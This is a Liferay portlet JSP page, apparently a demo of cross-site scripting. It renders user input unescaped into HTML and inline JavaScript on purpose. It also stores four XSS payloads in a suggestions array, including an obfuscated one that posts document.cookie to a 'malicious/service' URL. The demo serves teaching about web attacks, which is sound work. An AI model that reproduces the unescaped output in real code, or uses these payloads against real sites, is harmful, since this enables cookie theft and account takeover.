<%@ include file="./init.jsp" %>

<%
String firstName = GetterUtil.getString(renderRequest.getAttribute("firstName"));
String lastName = GetterUtil.getString(renderRequest.getAttribute("lastName"));
String hiddenField = GetterUtil.getString(renderRequest.getAttribute("hiddenField"));
%>
<liferay-portlet:actionURL
	varImpl="submitActionURL" name="/submit/action" />

<aui:form name="fm" action="<%= submitActionURL.toString() %>">
	<c:if test="<%= Validator.isNotNull(firstName) || Validator.isNotNull(lastName) %>">
		<p>Hello, <%= firstName %> <%= lastName %></p>
	</c:if>
	<aui:row>
		<aui:col>
			<aui:input type="text" name="firstName" label="first-name" value="<%= firstName %>"/>
		</aui:col>	
	</aui:row>
	<aui:row>
		<aui:col>
			<aui:input type="text" name="lastName" label="last-name" value="<%= lastName %>"/>
		</aui:col>
		<aui:col cssClass="hide">
			<aui:input type="text" name="hiddenField" value="<%= hiddenField %>"/>
		</aui:col>
	</aui:row>
	<aui:button-row>
		<aui:button type="submit" name="submit" value="submit"/>
	</aui:button-row>

	<aui:button-row>
		<% 
		for (int i = 0 ; i < 4; i++) {
		%>
			<aui:a href="#" cssClass="btn btn-danger btn-default" label="<%= "xss-injection-demo-" + (1+i) %>" 
				onclick="<%= "xssInjectionSuggestions(" + i +")" %>" />
		<%
		}
		%>
	</aui:button-row>
</aui:form>

<aui:script>
	var firstName = '<%= firstName %>';
	var lastName = '<%= lastName %>';
	var hiddenField = '<%= hiddenField %>';
	console.log("firstName: " + firstName);
	console.log("lastName: " + lastName);
	var lastNameField = $("#<portlet:namespace/>lastName");
	var suggestions = [
		"'+eval(unescape(\"alert%28document.cookie%29\"))+'",
		"< img src=# onerror=javascript:alert(String.fromCharCode(88,83,83)) >< /img >",
		"< script > alert('remove-spaces-and-see-what-happens-after-submit') < / script >",
		"';eval(String.fromCharCode(118,97,114,32,117,114,108,61,34,104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,109,97,108,105,99,105,111,117,115,47,115,101,114,118,105,99,101,34,59,36,46,112,111,115,116,40,117,114,108,44,34,99,111,111,107,105,101,115,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59));'"
	];
	function xssInjectionSuggestions(index) {
		event.preventDefault();
		lastNameField.val(suggestions[index]);
	}
</aui:script>